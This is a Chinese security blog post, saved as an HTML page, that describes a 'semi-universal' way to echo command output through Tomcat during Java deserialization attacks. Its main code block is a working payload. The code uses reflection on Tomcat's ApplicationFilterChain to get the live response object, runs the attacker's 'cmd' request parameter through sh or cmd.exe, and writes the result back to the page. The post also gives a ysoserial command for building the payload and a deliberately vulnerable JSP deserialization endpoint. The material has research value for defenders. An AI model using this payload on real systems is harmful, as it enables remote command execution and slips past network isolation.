@@ -1,0 +1,535 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Tomcat中一种半通用回显方法 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2020/03/Tomcat中一种半通用回显方法/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                    </div>
+                    <h1>Tomcat中一种半通用回显方法</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2020-03-06
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前段时间和@lufei 大哥学习了一波Linux下基于文件描述符的反序列化回显方式的思路。</p>
+<p>在自己实现的过程中发现，是通过IP和端口号的筛选，从而过滤出当前线程（也可以说是请求）的文件描述符，进而加入回显的内容。</p>
+<p>但是同时也有一个疑问，我们使用回显的目前主要是因为一些端口的过滤，一些内外网的隔离。从而将一些无法从别的途径传输的执行结果，通过http请求的方式，附加在原本的response中，从而绕过一些防护和限制。</p>
+<p>以个人的理解，在这种情况下，大概率会有一些负载均衡在真正的服务器前面，这样服务器中显示的ip和端口都会是LB的信息，这种筛选的方式也就失效了。</p>
+<p>当时的想法也是如果能直接获取到当前请求的response变量，直接write就可以了。但是对tomcat不是很熟悉，弄了个简易版适配Spring的就没后文了。</p>
+<p>最近又在社区中看到一个师傅发了这个Linux文件描述符的回显方式，评论处也提出了如果能直接获取response的效果会更好，于是就开始试着找了下如何获取tomcat的response变量。</p>
+<p> <a href="https://xz.aliyun.com/t/7307" target="_blank" rel="noopener">https://xz.aliyun.com/t/7307</a> </p>
+<h1 id="寻找过程"><a href="#寻找过程" class="headerlink" title="寻找过程"></a>寻找过程</h1><p>这里起的是一个spring boot，先试着往Controller里面注入一个response</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200306003340.png" alt></p>
+<p>为了确保我们获取到的response对象确实是tomcat的response，我们顺着堆栈一直往下。</p>
+<p>可以发现request和response几乎就是一路传递的，并且在内存中都是同一个变量（变量toString最后的数字就是当前变量的部分哈希）</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200306003553.png" alt></p>
+<p>这样，就没有问题，只要我们能获取到这些堆栈中，任何一个类的response实例即可。</p>
+<p>接下来就是找哪里的response变量可以被我们获取，比较蛋疼的是，每个函数都是通过传参的方式传递的response和request。</p>
+<p>那这样的话，在这过程中request和response有没有在哪里被记录过，而且为了通用性，我们只应该寻找tomcat部分的代码，和spring相关的就可以不用看了。</p>
+<p>而且记录的变量不应该是一个全局变量，而应该是一个ThreadLocal，这样才能获取到当前线程的请求信息。而且最好是一个static静态变量，否则我们还需要去获取那个变量所在的实例。</p>
+<p>顺着这个思路，刚好在<code>org.apache.catalina.core.ApplicationFilterChain</code>这个类中，找到了一个符合要求的变量。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200306004856.png" alt></p>
+<p>而且很巧的是，刚好在处理我们Controller逻辑之前，有记录request和response的动作。</p>
+<p>虽然if条件是false，但是不要紧，我们有反射。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200306005133.png" alt></p>
+<p>这样，整体的思路大概就是</p>
+<p>1、反射修改<code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>，让代码逻辑走到if条件里面</p>
+<p>2、初始化<code>lastServicedRequest</code>和<code>lastServicedResponse</code>两个变量，默认为null</p>
+<p>3、从<code>lastServicedResponse</code>中获取当前请求response，并且回显内容。</p>
+<p>写的过程中也学习了一下怎么通过反射修改一个private final的变量，还踩了一些坑，总之直接放上最后的代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">Field WRAP_SAME_OBJECT_FIELD = Class.forName(<span class="string">"org.apache.catalina.core.ApplicationDispatcher"</span>).getDeclaredField(<span class="string">"WRAP_SAME_OBJECT"</span>);</span><br><span class="line">Field lastServicedRequestField = ApplicationFilterChain.class.getDeclaredField("lastServicedRequest");</span><br><span class="line">Field lastServicedResponseField = ApplicationFilterChain.class.getDeclaredField("lastServicedResponse");</span><br><span class="line">Field modifiersField = Field.class.getDeclaredField("modifiers");</span><br><span class="line">modifiersField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">modifiersField.setInt(WRAP_SAME_OBJECT_FIELD, WRAP_SAME_OBJECT_FIELD.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">modifiersField.setInt(lastServicedRequestField, lastServicedRequestField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">modifiersField.setInt(lastServicedResponseField, lastServicedResponseField.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">WRAP_SAME_OBJECT_FIELD.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">lastServicedRequestField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">lastServicedResponseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">ThreadLocal&lt;ServletResponse&gt; lastServicedResponse =</span><br><span class="line">    (ThreadLocal&lt;ServletResponse&gt;) lastServicedResponseField.get(<span class="keyword">null</span>);</span><br><span class="line">ThreadLocal&lt;ServletRequest&gt; lastServicedRequest = (ThreadLocal&lt;ServletRequest&gt;) lastServicedRequestField.get(<span class="keyword">null</span>);</span><br><span class="line"><span class="keyword">boolean</span> WRAP_SAME_OBJECT = WRAP_SAME_OBJECT_FIELD.getBoolean(<span class="keyword">null</span>);</span><br><span class="line">String cmd = lastServicedRequest != <span class="keyword">null</span></span><br><span class="line">    ? lastServicedRequest.get().getParameter(<span class="string">"cmd"</span>)</span><br><span class="line">    : <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (!WRAP_SAME_OBJECT || lastServicedResponse == <span class="keyword">null</span> || lastServicedRequest == <span class="keyword">null</span>) &#123;</span><br><span class="line">    lastServicedRequestField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;());</span><br><span class="line">    lastServicedResponseField.set(<span class="keyword">null</span>, <span class="keyword">new</span> ThreadLocal&lt;&gt;());</span><br><span class="line">    WRAP_SAME_OBJECT_FIELD.setBoolean(<span class="keyword">null</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (cmd != <span class="keyword">null</span>) &#123;</span><br><span class="line">    ServletResponse responseFacade = lastServicedResponse.get();</span><br><span class="line">    responseFacade.getWriter();</span><br><span class="line">    java.io.Writer w = responseFacade.getWriter();</span><br><span class="line">    Field responseField = ResponseFacade.class.getDeclaredField("response");</span><br><span class="line">    responseField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Response response = (Response) responseField.get(responseFacade);</span><br><span class="line">    Field usingWriter = Response.class.getDeclaredField("usingWriter");</span><br><span class="line">    usingWriter.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    usingWriter.set((Object) response, Boolean.FALSE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">    String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">    <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">        isLinux = <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, cmd&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd&#125;;</span><br><span class="line">    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">    String output = s.hasNext() ? s.next() : <span class="string">""</span>;</span><br><span class="line">    w.write(output);</span><br><span class="line">    w.flush();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>原本Contorller代码的逻辑是输出input部分的内容，我们所做的就是在原本的输出内容前面，添加cmd参数执行之后的结果。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/2.gif" alt></p>
+<p>需要刷新两次的原因是因为第一次只是通过反射去修改值，这样在之后的运行中就会cache我们的请求，从而也就能获取到response。</p>
+<h1 id="加入ysoserial"><a href="#加入ysoserial" class="headerlink" title="加入ysoserial"></a>加入ysoserial</h1><p>这样，这样只要稍加改造一下，擦去泛型的部分，用完整的类名代替原本的类名，就可以放入到ysoserial中。</p>
+<p>中间莫名又踩了一些坑，嫌麻烦的师傅可以直接用已经改好的版本。</p>
+<p> <a href="https://github.com/kingkaki/ysoserial" target="_blank" rel="noopener">https://github.com/kingkaki/ysoserial</a> </p>
+<p>ysoserial的第二个参数是要执行的命令，由于这里可以直接从request获取，自由度更大，所以我将第二个参数改成了要执行的命令的param。</p>
+<p>以<code>CommonsCollections2</code>为例，如下的方式就相当于创建了一个从cmd参数获取要执行的命令的payload。</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">java</span> <span class="selector-tag">-jar</span> <span class="selector-tag">ysoserial-0</span><span class="selector-class">.0</span><span class="selector-class">.6-SNAPSHOT-all</span><span class="selector-class">.jar</span> <span class="selector-tag">CommonsCollections2TomcatEcho</span> <span class="selector-tag">cmd</span></span><br></pre></td></tr></table></figure>
+<p>测试一下别的tomcat环境，以jsp为例，确保有<code>commons-collections4</code>的依赖</p>
+<p>然后自己构造一个反序列化的环境</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	String input = request.getParameter(<span class="string">"input"</span>);</span><br><span class="line">	<span class="keyword">byte</span>[] b = <span class="keyword">new</span> sun.misc.BASE64Decoder().decodeBuffer(input);</span><br><span class="line">    java.io.ObjectInputStream ois = <span class="keyword">new</span> java.io.ObjectInputStream(<span class="keyword">new</span> java.io.ByteArrayInputStream(b));</span><br><span class="line">    ois.readObject();</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+<p>可以看到内容成功的追加到了输出的body中。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200306134256.png" alt></p>
+<h1 id="一些局限性"><a href="#一些局限性" class="headerlink" title="一些局限性"></a>一些局限性</h1><p>回到标题，为什么是一个半通用的方法呢？</p>
+<p>当时构造好了之后兴匆匆的跑了一波shiro的反序列化，死活不成功，debug了很久之后发现了一个问题。</p>
+<p>shiro的rememberMe功能，其实是shiro自己实现的一个filter</p>
+<p>在<code>org.apache.catalina.core.ApplicationFilterChain</code>的<code>internalDoFilter</code>中(省略一些无用的代码)</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">    ApplicationFilterConfig filterConfig = filters[pos++];</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Filter filter = filterConfig.getFilter();</span><br><span class="line">		...</span><br><span class="line">         filter.doFilter(request, response, <span class="keyword">this</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (...)</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// We fell off the end of the chain -- call the servlet instance</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (ApplicationDispatcher.WRAP_SAME_OBJECT) &#123;</span><br><span class="line">        lastServicedRequest.set(request);</span><br><span class="line">        lastServicedResponse.set(response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; !servletSupportsAsync) &#123;</span><br><span class="line">        request.setAttribute(Globals.ASYNC_SUPPORTED_ATTR,</span><br><span class="line">                             Boolean.FALSE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Use potentially wrapped request from this point</span></span><br><span class="line">    <span class="keyword">if</span> (...)&#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        servlet.service(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (...) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到是先取出所有的的filter对当前请求进行拦截，通过之后，再进行cache request，再从<code>servlet.service(request, response)</code>进入jsp的逻辑代码。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200306135248.png" alt></p>
+<p>rememberMe功能就是ShiroFilter的一个模块，这样的话在这部分逻辑中执行的代码，还没进入到cache request的操作中，此时的cache内容就是空，从而也就获取不到我们想要的response。</p>
+<h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>ysoserial中所有用<code>createTemplatesImpl</code>生成payload的链都已加入了Tomcat回显的模式。</p>
+<p> <a href="https://github.com/kingkaki/ysoserial" target="_blank" rel="noopener">https://github.com/kingkaki/ysoserial</a> </p>
+<ul>
+<li>CommonsCollections2TomcatEcho</li>
+<li>CommonsCollections3TomcatEcho</li>
+<li>CommonsCollections4TomcatEcho</li>
+</ul>
+<p>感觉也不仅限于反序列化吧，一些拥有java代码执行的场景都通过这种方式，实现Tomcat的回显。</p>
+<p>比较蛋疼的一点就是一些filter中执行的代码不适用，就很可能不适用于很多框架型的漏洞，但是对于开发任人员写的Controller中的场景应该都是可以的。</p>
+<p>技术比较菜，如果有师傅发现了更好的利用方式，或者一些文章中的疏漏，都可以一起探讨。</p>
+
+
+                <hr>
+
+                
+
+                <ul class="pager">
+                    
+                        <li class="previous">
+                            <a href="/2020/03/Kubernetes基本概念和一些未授权访问/" data-toggle="tooltip" data-placement="top" title="Kubernetes基本概念和一些未授权访问">&larr; Previous Post</a>
+                        </li>
+                    
+                    
+                        <li class="next">
+                            <a href="/2020/02/ysoserial-payload分析/" data-toggle="tooltip" data-placement="top" title="ysoserial payload分析">Next Post &rarr;</a>
+                        </li>
+                    
+                </ul>
+
+                
+
+                
+
+            </div>
+    <!-- Side Catalog Container -->
+        
+
+    <!-- Sidebar Container -->
+
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <!-- no hr -->
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                       
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                    </div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+
+                    
+                        <li><a href="//98587329.github.io" target="_blank">mt</a></li>
+                    
+                        <li><a href="//www.cflowerth.com" target="_blank">FAtwAER</a></li>
+                    
+                        <li><a href="//lufe1.cn" target="_blank">lufei</a></li>
+                    
+                        <li><a href="//0x3f97.github.io" target="_blank">gd</a></li>
+                    
+                        <li><a href="http://www.lsafe.org" target="_blank">4dmin$5</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">theKingOfNight</a></li>
+                    
+                        <li><a href="http://www.thekingofnight.com/" target="_blank">Hpdoger</a></li>
+                    
+                        <li><a href="//mochazz.github.io/" target="_blank">七月火</a></li>
+                    
+                        <li><a href="https://mengsec.com/" target="_blank">蒙尘</a></li>
+                    
+                        <li><a href="https://patrilic.top/" target="_blank">Patrilic</a></li>
+                    
+                        <li><a href="https://threedr3am.github.io/" target="_blank">threedr3am</a></li>
+                    
+                        <li><a href="http://rui0.cn/" target="_blank">Ruilin</a></li>
+                    
+                        <li><a href="https://zgao.top/" target="_blank">zgao</a></li>
+                    
+                        <li><a href="https://www.zfjsec.com/" target="_blank">zfjsec</a></li>
+                    
+                </ul>
+                
+            </div>
+
+        </div>
+    </div>
+</article>
+
+
+
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("https://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+
+
+    <!-- Footer -->
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                
+                
+                
+
+                
+
+                
+
+                
+                    <li>
+                        <a target="_blank"  href="https://github.com/kingkaki">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                
+
+                
+
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Kingkk&#39;s Blog 2022 
+                    浙ICP备17041487号
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a> 
+                    <span style="display: inline-block; margin: 0 5px;">
+                        <i class="fa fa-heart"></i>
+                    </span> 
+                    Ported by <a href="http://blog.kaijun.rocks">Kaijun</a>
+
+                    <!-- | 
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="91px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=kaijun&repo=hexo-theme-huxblog&type=star&count=true" >
+                    </iframe>
+                    -->
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js"></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js"></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/    
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async("https://www.kingkk/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("https://cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+
+<!-- Baidu Tongji -->
+
+<script>
+    // dynamic User by Hux
+    var _baId = '2095437387a20021fd7e176e0c1aac8b';
+
+    // Originial
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?" + _baId;
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+</script>
+
+
+<!-- Side Catalog -->
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+
+</html>
